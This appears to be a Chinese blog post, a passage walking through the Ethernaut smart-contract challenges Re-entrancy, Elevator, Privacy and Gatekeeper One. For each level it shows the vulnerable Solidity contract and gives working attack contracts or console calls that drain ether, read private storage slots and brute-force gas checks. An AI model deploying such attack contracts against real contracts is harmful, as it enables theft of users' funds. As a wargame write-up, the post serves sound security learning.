<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 4.2.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico"><link rel="mask-icon" href="/images/favicon.ico" color="#222"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"yalexin.gitee.io",root:"/",scheme:"Gemini",version:"7.7.1",exturl:!1,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!0},copycode:{enable:!0,show_result:!0,style:"mac"},back2top:{enable:!0,sidebar:!1,scrollpercent:!0},bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!1,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"search.xml"}</script><meta name="description" content="原文再续，书接上回，本文继续闯关，本次我们来学习重入漏洞、Solidity存储布局、ERC20代币标准、delegatecall、交易追踪和字节码等知识。"><meta property="og:type" content="article"><meta property="og:title" content="【Ethernaut闯关录】中篇"><meta property="og:url" content="https://yalexin.gitee.io/2023/03/11/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%AD%E7%AF%87/index.html"><meta property="og:site_name" content="黄阿信"><meta property="og:description" content="原文再续，书接上回，本文继续闯关，本次我们来学习重入漏洞、Solidity存储布局、ERC20代币标准、delegatecall、交易追踪和字节码等知识。"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230218130226.png"><meta property="og:image" content="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230304132643.png"><meta property="article:published_time" content="2023-03-11T11:24:47.000Z"><meta property="article:modified_time" content="2023-03-11T11:43:28.335Z"><meta property="article:author" content="YaleXin"><meta property="article:tag" content="Solidity"><meta property="article:tag" content="Web3.0"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230218130226.png"><link rel="canonical" href="https://yalexin.gitee.io/2023/03/11/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%AD%E7%AF%87/"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0}</script><title>【Ethernaut闯关录】中篇 | 黄阿信</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span><span class="toggle-line toggle-line-middle"></span><span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><div><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">黄阿信</span><span class="logo-line-after"><i></i></span></a></div><p class="site-subtitle">要么改变世界，要么适应世界。</p></div><div class="site-nav-right"><div class="toggle popup-trigger"></div></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-fw fa-home"></i> 首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i> 标签<span class="badge">107</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i> 分类<span class="badge">13</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i> 归档<span class="badge">118</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook/" rel="section"><i class="fa fa-fw fa-book"></i> 留言板</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-fw fa-link"></i> 友链</a></li></ul></nav></div></header><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span>0%</span></div><div class="reading-progress-bar"></div><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content"><div class="posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://yalexin.gitee.io/2023/03/11/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%AD%E7%AF%87/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/uploads/cat_mouse.jpg"><meta itemprop="name" content="YaleXin"><meta itemprop="description" content="学渣一枚"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="黄阿信"></span><header class="post-header"><h1 class="post-title" itemprop="name headline"> 【Ethernaut闯关录】中篇</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建时间：2023-03-11 19:24:47 / 修改时间：19:43:28" itemprop="dateCreated datePublished" datetime="2023-03-11T19:24:47+08:00">2023-03-11</time></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">网络攻防</span></a></span></span><span id="/2023/03/11/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%AD%E7%AF%87/" class="post-meta-item leancloud_visitors" data-flag-title="【Ethernaut闯关录】中篇" title="阅读次数"><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="post-meta-item-text">阅读次数：</span><span class="leancloud-visitors-count"></span></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">本文字数：</span> <span>20k</span></span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="fa fa-clock-o"></i></span> <span class="post-meta-item-text">阅读时长 &asymp;</span> <span>18 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><p>原文再续，书接上回，本文继续闯关，本次我们来学习重入漏洞、Solidity存储布局、ERC20代币标准、delegatecall、交易追踪和字节码等知识。<a id="more"></a></p><h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &#39;openzeppelin-contracts-06&#x2F;math&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address &#x3D;&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] &#x3D; balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;&#x3D; _amount) &#123;</span><br><span class="line">      (bool result,) &#x3D; msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -&#x3D; _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通关条件：将合约代币都偷走。</p><p>考察的是重入漏洞，该漏洞恐怕是智能合约上面最臭名昭著的漏洞了，<code>withdraw</code>函数中，先进行转账(以<code>call</code>的方式)，然后才更新余额，那么如果转账目的方是一个合约账户，在转账过程又会继续调用<code>withdraw</code>函数，则此时<code>balances[msg.sender]</code>来不及更新，则会造成合约的代币被盗取。著名的DAO攻击就是利用了该漏洞。</p><p>具体而言，参照下面的合约：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Target&#123;</span><br><span class="line">     function donate(address _to) external payable ;</span><br><span class="line">     function withdraw(uint _amount) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ReEntrancyAttack &#123;</span><br><span class="line">	address public instance ;</span><br><span class="line">  	constructor(address _instance) payable &#123;</span><br><span class="line">        instance &#x3D; _instance;  </span><br><span class="line">  	&#125;</span><br><span class="line">    fallback()payable external&#123;</span><br><span class="line">    &#x2F;&#x2F; 通过查看可知，Reentrance 合约中有 0.001 ether</span><br><span class="line">        Target target &#x3D; Target(instance);</span><br><span class="line">        target.withdraw(0.001 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    function donate()public returns(bool)&#123;</span><br><span class="line">        Target target &#x3D; Target(instance);</span><br><span class="line">        target.donate&#123;value: 0.001 ether&#125;(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">    function attack()public returns(bool)&#123;</span><br><span class="line">        Target target &#x3D; Target(instance);</span><br><span class="line">        target.withdraw(0.001 ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击流程：我们部署我们的攻击合约（部署的时候传入<code>Reentrance</code>合约地址），同时往攻击合约<code>ReEntrancyAttack</code>中转入0.001 ether，接着调用<code>donate</code>，然后在控制台输入<code>fromWei(await contract.balanceOf(&#39;0x11Ef368C1D3226dce5c53A9880b0DF148Ea3D0a1&#39;))</code>即可发现我们已经放入<code>0.001 ether</code>,此时可以调用我们的<code>attack</code>函数，调用完毕，我们的攻击合约将会得到<code>0.002 ether</code>，即我们不仅拿回了原本放进合约<code>Reentrance</code>中的<code>0.001 ether</code>，还顺带把<code>Reentrance</code>本身有的<code>0.001 ether</code>拿了过来。</p><h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">&#x2F;&#x2F; 判断是不是最后一层</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building &#x3D; Building(msg.sender);</span><br><span class="line">    &#x2F;&#x2F; 如果指定层_floor不是最后一层，则移动到该指定层，并继续判断</span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor &#x3D; _floor;</span><br><span class="line">      top &#x3D; building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通关条件：将<code>top</code>置为<code>ture</code>。</p><p>本题目和<code>solidity</code>特性好像关联不是很大，考察的是逻辑漏洞，我们想要<code>top</code>为真，则<code>if</code>语句的<code>building.isLastFloor(_floor)</code>必须返回<code>false</code>，但是下面的19行处<code>building.isLastFloor(floor)</code>又要求返回<code>true</code>，对相同值返回不同的结果，看上去貌似矛盾，其实，我们可以这样子想想，只要第一次调用<code>isLastFloor</code>返回是<code>false</code>,后面调用再返回<code>true</code>不就行了吗？如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract ElevatorAttack&#123;</span><br><span class="line">    uint public state;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">    	state &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function isLastFloor(uint) external returns (bool)&#123;</span><br><span class="line">    &#x2F;&#x2F; 第一次调用</span><br><span class="line">		if (state &#x3D;&#x3D; 0)&#123;</span><br><span class="line">			state &#x3D; state + 1;</span><br><span class="line">			return false;</span><br><span class="line">		&#125; else&#123;</span><br><span class="line">		&#x2F;&#x2F; 第二次及以后</span><br><span class="line">			return true;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked &#x3D; true;</span><br><span class="line">  uint256 public ID &#x3D; block.timestamp;</span><br><span class="line">  uint8 private flattening &#x3D; 10;</span><br><span class="line">  uint8 private denomination &#x3D; 255;</span><br><span class="line">  uint16 private awkwardness &#x3D; uint16(block.timestamp);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">    data &#x3D; _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key &#x3D;&#x3D; bytes16(data[2]));</span><br><span class="line">    locked &#x3D; false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;</span><br><span class="line">      .,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,</span><br><span class="line">      *.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^         ,---&#x2F;V\</span><br><span class="line">      &#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.    ~|__(o.o)</span><br><span class="line">      ^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;  UU  UU</span><br><span class="line">  *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通关条件</strong>：将<code>locked</code>改为<code>false</code></p><p>跟<code>Vault</code>关卡很像，可以说是它的升级版，在这里就得好好说一下solidity中的状态变量存储方式了，参考<a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html" target="_blank" rel="noopener">【官方文档】</a>，我们可知：</p><blockquote><p>存储大小少于 32 字节的多个变量会被打包到一个 存储插槽storage slot 中，规则如下：</p><ul><li>存储插槽storage slot 的第一项会以低位对齐的方式储存。</li><li>值类型仅使用存储它们所需的字节。</li><li>如果 存储插槽storage slot 中的剩余空间不足以储存一个值类型，那么它会被存入下一个 存储插槽storage slot 。</li><li>结构体（struct）和数组数据总是会开启一个新插槽（但结构体或数组中的各元素，则按规则紧密打包）。</li><li>结构体和数组之后的数据也或开启一个新插槽。</li></ul></blockquote><p>由于 映射mapping 和动态数组不可预知大小，不能在状态变量之间存储他们。相反，他们自身根据 <a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html#storage-inplace-encoding" target="_blank" rel="noopener">以上规则</a> 仅占用 32 个字节，然后他们包含的元素的存储的其实位置，则是通过 Keccak-256 哈希计算来确定，比较复杂，可以在<a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html" target="_blank" rel="noopener">【文档】</a>中查看，这里不涉及，就不带大家看了。</p><p>因此根据变量类型和对应占用字节数，<code>Privacy</code>中的存储分布大致如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------------------------------------</span><br><span class="line">|              unused (30)                         | locked (1)| &lt;- slot 0</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                          ID (32)                             | &lt;- slot 1</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|   unused(28)   | awkwardness(2)|denomination(1)|flattening(1)| &lt;- slot 2</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                         data[0] (32)                         | &lt;- slot 3</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                         data[1] (32)                         | &lt;- slot 4</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                         data[2] (32)                         | &lt;- slot 5</span><br><span class="line">----------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>因此我们使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="string">"5"</span>)</span><br><span class="line">&gt; <span class="string">'0xa264a1b3d12c27658b731ce1c5c631521539801e9e246f3c0e3e03dd408a8de8'</span></span><br></pre></td></tr></table></figure><p>就可以获取<code>data[2]</code>了，但是<code>bytes16(data[2])</code>会截取其低位的值，又因为对其方式，因此<code>a264a1b3d12c27658b731ce1c5c63152</code>才是我们想要的结果。</p><h2 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender !&#x3D; tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft() % 8191 &#x3D;&#x3D; 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) &#x3D;&#x3D; uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) !&#x3D; uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) &#x3D;&#x3D; uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通关条件</strong>：正常执行完<code>enter</code>函数。</p><p>我们先来看看，如何绕过三个<code>gate</code>函数，第一个可以参照<code>Telephone</code>关卡，借助第三方合约即可。</p><p>对于第二个函数，<code>gasleft()</code>返回的是当前可用的<code>gas</code>，这个要你知道该合约运行到这一行时候，所消耗的<code>gas</code>，需要我们直到题目使用的编译器，然后放到本地调试，这种方法太麻烦了，所以我选择枚举，即调用时候设置gas为<code>n*8191+x</code>，不断改变x，再调用即可。</p><p>对于第三个函数，假设<code>_gatekey</code>可以被下面数字表示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xab cd ef gh ij kl mn op</span><br></pre></td></tr></table></figure><p>对于第一个条件，要求<code>ijklmnop==0000mnop</code>,即<code>ijkl=0000</code>，</p><p>对于第二个条件，要求<code>00000000ijklmnop!=abcdefghijklmnop</code>，即<code>00000000!=abcdefgh</code></p><p>第三个条件，要求<code>ijklmnop==0000xxxx</code>，其中，<code>xxxx</code>是<code>tx.origin</code>的低两个字节。</p><p>故，满足条件的一个<code>_gateKey</code>为<code>1111111100001df4</code>（我的metamask账户的最低两字节是<code>1df4</code>）</p><p>综上，我们可以借助下面的攻击合约：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOneAttack &#123;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        &#x2F;&#x2F; 	该地址可以在控制台中输入 &#96;instance&#96; 获取</span><br><span class="line">        address _addr &#x3D; 0x8F29B1467240Ccd340BD33371559cC76729b8e27;</span><br><span class="line">        bytes8 _gateKey &#x3D; 0x1111111100001df4;</span><br><span class="line">        for(uint x &#x3D; 0; x &lt; 8191; x +&#x3D; 1)&#123;</span><br><span class="line">            (bool success, bytes memory data) &#x3D; _addr.call&#123;gas: 81910 + x&#125;(</span><br><span class="line">                abi.encodeWithSignature(&quot;enter(bytes8)&quot;, _gateKey)</span><br><span class="line">            );</span><br><span class="line">            if(success)&#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender !&#x3D; tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x :&#x3D; extcodesize(caller()) &#125;</span><br><span class="line">    require(x &#x3D;&#x3D; 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) &#x3D;&#x3D; type(uint64).max);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通关条件</strong>：正常执行完<code>enter</code>函数。</p><p>关于第一个条件，参照关卡【Gatekeeper 